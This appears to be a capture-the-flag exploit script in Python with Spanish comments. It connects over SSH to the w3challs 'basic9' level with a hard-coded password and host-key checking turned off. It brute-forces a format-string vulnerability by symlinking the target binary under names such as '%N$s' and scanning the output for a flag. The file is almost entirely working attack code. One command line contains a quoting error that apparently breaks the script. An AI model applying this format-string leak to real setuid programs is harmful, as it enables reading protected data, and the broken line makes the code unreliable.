#!/usr/bin/env python3

import pexpect
import sys

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])

print("[✓] Conectado!")
print("\n[*] BÚSQUEDA EXHAUSTIVA - TODAS LAS POSICIONES")

child.sendline(b"cd /tmp && rm -f z* 2>/dev/null")
child.expect([b'\\$'])

found = False

# Buscar en TODAS las posiciones del 1 al 500
for i in range(1, 501):
    if i % 50 == 0:
        print(f"  Probadas {i} posiciones...")
        sys.stdout.flush()
    
    # Crear symlink con %i$s
    cmd = f'ln -sf /home/basic9/basic9 \'%{i}$s\' 2>/dev/null && timeout 0.1 ./'%{i}$s' x 2>&1 | grep -o "W3C{{[^}}]*}}" | head -1'.encode()
    child.sendline(cmd)
    
    try:
        index = child.expect([b'\\$', b'W3C{'], timeout=0.5)
        
        if index == 1:
            # ENCONTRADO!
            child.expect([b'}'], timeout=1)
            flag = b'W3C{' + child.before + b'}'
            
            print(f"\n🔥🔥🔥 FLAG ENCONTRADA EN POSICIÓN {i} 🔥🔥🔥")
            print(f"FLAG: {flag.decode('utf-8', errors='ignore')}")
            found = True
            break
    except:
        pass

if not found:
    print("\n[!] No encontrado en 1-500")
    print("[*] La flag debe estar en una posición > 500 o necesita otro método")

child.close()